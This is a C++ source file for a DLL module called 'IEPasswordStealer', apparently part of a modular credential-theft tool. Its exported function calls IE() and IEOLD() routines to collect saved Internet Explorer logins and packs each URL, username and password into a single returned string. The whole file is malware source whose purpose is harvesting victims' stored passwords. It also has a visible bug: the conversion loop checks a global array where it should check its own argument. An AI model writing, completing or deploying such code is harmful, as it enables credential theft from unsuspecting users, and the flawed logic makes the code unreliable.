// _s_Module_Browser_Info_IEPasswordStealer.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "_s_Module_Browser_Info_IEPasswordStealer.h"  
#include "Public.h"
#include "IE.h"
#include "IEOLD.h"
BSTR ANSItoBSTR(const char* input)
{
	BSTR result = NULL;
	int lenA = lstrlenA(input);
	int lenW = ::MultiByteToWideChar(CP_ACP, 0, input, lenA, NULL, 0);
	if (lenW > 0)
	{
		result = ::SysAllocStringLen(0, lenW);
		::MultiByteToWideChar(CP_ACP, 0, input, lenA, result, lenW);
	}
	return result;
}


BSTR ConvertInfoToBstr(INFO *inf)
{
	_bstr_t  RetValue = L"";
	_bstr_t  OneValue = L"";
	char  OneInfo[2048];
	for (int i = 0;;i++)
	{
		if (info[i].it)
		{

			sprintf(OneInfo, "Url=%s\r\nUserName=%s\r\nPassword=%s\r\n", inf[i].url, inf[i].uname, inf[i].upass);
			OneValue = ANSItoBSTR(OneInfo);

			RetValue += OneValue;
			inf[i].it = false;
		}
		else
		{
			break;
		}
	}
	return RetValue;
}






BSTR  GetIEPasswordFromDLL()
{
	info = new INFO[500];
	info1 = new INFO[500];
	for (int i = 0;i < 500;i++)
	{
		info[i].it = false;
		info1[i].it = false;
	}
	IE();
	IEOLD();
	_bstr_t Infos= ConvertInfoToBstr(info);
	Infos+= ConvertInfoToBstr(info1);
	
	
	return Infos;
}
